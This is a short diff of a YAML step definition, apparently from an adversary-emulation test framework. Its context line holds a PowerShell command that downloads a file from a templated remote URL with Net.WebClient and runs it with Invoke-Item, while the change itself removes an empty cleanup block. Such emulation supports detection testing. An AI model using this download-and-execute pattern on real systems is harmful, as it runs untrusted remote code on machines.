@@ -23,6 +23,3 @@ steps:
       inline: |
         (New-Object Net.WebClient).DownloadString('{{.Args.target_remote_file}}') | Out-File {{.Args.output_file}}; Invoke-Item {{.Args.output_file}}
       executor: powershell
-      cleanup:
-        inline: ""
-        executor: powershell
